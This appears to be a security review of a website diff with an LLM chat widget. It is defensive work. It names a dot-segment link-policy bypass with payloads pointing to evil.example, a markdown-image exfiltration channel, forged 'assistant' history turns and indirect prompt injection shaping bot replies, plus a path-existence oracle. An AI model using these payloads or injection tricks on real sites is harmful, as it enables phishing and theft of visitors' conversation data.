findings.summary: The link policy can be bypassed with dot segments, and this diff introduced the bypass. classifyHref accepts '/.//evil.example', '/..//evil.example', '/a/..//evil.example', '/%2e//evil.example' and '/./\evil.example' as INTERNAL, because the first character after '/' is not '/' or '\'. It then returns the normalised url.pathname, which the WHATWG parser reduces to '//evil.example'. MarkdownRenderer.tsx:47 writes that value into <a href>. A protocol-relative href resolves to https://evil.example/. Executed in jsdom: the rendered href is '//evil.example', with no target, no new-tab marker and no external-link styling. A plain left click is accidentally safe, because react-router collapses '//' and pushState received '/evil.example'. But a middle-click, a Ctrl/Cmd/Shift-click (the handler deliberately returns early for these, MarkdownRenderer.tsx:28), 'open in new tab' or a copied link lands on the attacker's host. Attack: a reply the visitor steered, or one shaped by an indirect prompt injection, presents an off-site phishing link as a same-site internal link. That defeats the stated guarantee of SEC-16/REQ-154 that 'internal' stays on this origin. On develop (0ff06a8) the raw href '/.//evil.example' resolved same-origin (https://sarayatechsolutions.com//evil.example), so this is a regression. links.test.ts has 30 cases and none covers dot segments.
findings.evidence: node on the worktree links.ts: classifyHref('/.//evil.com') -> {kind:'internal', href:'//evil.com'}; same for '/..//evil.com', '/a/..//evil.com', '/%2e//evil.com', '/%2e%2e//evil.com' and '/./' + backslash + 'evil.com'. vitest + jsdom, BrowserRouter + MarkdownRenderer content '[Book a call](/.//evil.example)': renderedHref='//evil.example', resolved='https://evil.example/', target=null.
findings.fix: In classifyHref, after the URL is resolved, reject any normalised result that leaves the single-slash form. Replace line 47 with: `const path = url.pathname; if (/^[/\\]{2}/.test(path)) return { kind: "text" }; return { kind: "internal", href: `${path}${url.search}${url.hash}` };`. Rendering it as text is preferable to re-classifying it as external, because a dot-segment off-site link is never legitimate. Add links.test.ts cases for all six payloads above, expecting kind 'text' with no off-origin href. Also add a MarkdownRenderer test asserting that no rendered <a> has an href that resolves (new URL(href, location.href).origin) to a foreign origin unless it carries target=_blank.
findings.recommendation: Fix before the develop -> main release PR. Two lines plus tests. It does not block integrate/s2 -> develop under the CRITICAL/HIGH rule.

findings.summary: This predates the diff and is unchanged by it. react-markdown renders images by default and the renderer has no img override, so a bot reply containing '![x](https://evil.example/p.png?d=...)' makes the visitor's browser fetch an arbitrary remote URL with no click. That is the classic markdown-image exfiltration channel: an injected reply can encode conversation content (which may include the visitor's name or email) into the query string. The CSP img-src ('self' data: blob: https://i.pravatar.cc) would block it, but the CSP is Report-Only. Reviewer test: the reply rendered . This diff hardened links (SEC-16) and left this sibling sink open.
findings.fix: Add `img: ({ alt }) => {alt}` to the components map, or pass `disallowedElements={['img']} unwrapDisallowed` to . Add a test asserting that no is rendered from a reply.
findings.recommendation: Bundle with the medium fix above.

findings.summary: `import.meta.env?.VITE_SITE_URL` uses optional chaining, so Vite cannot statically replace the member access. It materialises the whole import.meta.env object (every VITE_* variable in the build environment) and relies on Rollup's object-property tree-shaking to drop the unused keys. The emitted bundle has `qu={}`, `qu==null?void 0:qu.VITE_SITE_URL`. Today nothing leaks: the reviewer's canary build with VITE_OPENAI_API_KEY and VITE_CANARY_SECRET set produced 0 occurrences. But that protection depends on optimiser behaviour, and the develop review recorded that a VITE_OPENAI_API_KEY may still sit in the Cloudflare Pages build environment.
findings.fix: Use the static form `import.meta.env.VITE_SITE_URL as string | undefined`. Vite then substitutes only that one key, which is what openai.service.ts:45 already does. If the SSR/test path needs a guard, use `typeof import.meta.env !== 'undefined' ? import.meta.env.VITE_SITE_URL : undefined`. Separately (ops), delete VITE_OPENAI_API_KEY from the Cloudflare Pages environment as the develop review required.
findings.recommendation: Small chore; do it with the next seo.ts touch.

findings.summary: servePrerenderedRoutes calls existsSync(path.resolve(__dirname, 'dist', '.' + pathname, 'index.html')) on the raw, un-normalised req.url. That makes it a directory-existence oracle outside dist. Executed against a loopback `vite preview` of a scratch copy: '/../outside' (a sibling directory with an index.html) returned 404, while '/../nonexistent' returned 200 (the SPA shell). '/../../outside2' vs '/../../nonexist2' behaved the same way. No file content outside dist was ever served, because sirv still confines reads; '/..%2foutside', '/%2e%2e/outside', '/x/../../outside2' and '/../package.json' all returned the dist shell. Preview binds to localhost by default (server.host), and preview is never used in production (Cloudflare Pages serves dist).
findings.fix: Resolve, then confine: `const distDir = path.resolve(__dirname, 'dist'); const target = path.resolve(distDir, '.' + clean); if (!target.startsWith(distDir + path.sep)) return next();` before the existsSync check, or reject any pathname containing a '..' segment.

findings.summary: With the fetch fix, visitor messages and a client-held history reach the backend POST /api/chat, and from there the AI provider, for the first time. The frontend side is sound: it sends the capped {message, history}, shows a privacy notice, and logs no PII. Three properties now matter and only the backend can enforce them. (1) `history` is client-controlled: anyone can POST forged 'assistant' turns to prime the model, so the server must treat every history turn as untrusted and re-apply its caps. (2) Rate and cost limits must hold per IP/session. (3) The backend system prompt or knowledge base must be stripped of the unverified facts this diff removed from the frontend (old street address, phone, emails, Calendly), or the LLM will restate them. The frontend cannot prevent (3).
findings.fix: Backend review: confirm server-side Zod validation of {message, history}, role allowlist, caps, rate limit and token cap on /api/chat. Grep the backend prompt and KB for '2765', '783-0443', 'calendly' and 'info@'. Run /threat-model for the chat boundary.
findings.recommendation: Track in the backend repo before enabling the chat in production.

findings.summary: The STS-049 guard accepts http://localhost / 127.0.0.1 in a production-mode build, and tools/build-verify.mjs injects http://localhost:3001 whenever VITE_API_URL is unset. If Cloudflare Pages were ever configured with `npm run build:verify` instead of `npm run build`, production would ship a bundle that POSTs visitor chat and contact data to whatever listens on the visitor's own localhost:3001. The verified dist contains exactly that placeholder, which is expected for verification only.
findings.fix: Keep the Cloudflare build command as `npm run build`. Optionally make assertApiUrl reject localhost when process.env.CF_PAGES === '1'.

The unverified Calendly URL is present as an inert string in the client bundle (src/config/business.ts:56, booking.verified=false), by design, so the owner can flip one flag. It is never rendered or linked (tested), and it is not a secret.

verdict_rationale: No critical or high finding is introduced by this diff. The prerender and SEO head paths escape every value, all of their inputs are build-time constants, and the injection is immune to replacement patterns. The built site has no inline script, no secret and no source map, and it shows none of the removed unverified facts. The CSP change only tightens it. The dependency risk profile is unchanged. The one regression, a medium bypass of the chat link policy via dot segments (links.ts:47), is confirmed by execution. It needs a multi-click or new-tab action and a steered or injected bot reply, and it gives no script execution. Under the stated CRITICAL/HIGH gate it does not fail this merge, but it must be fixed, with tests, before the develop -> main release.
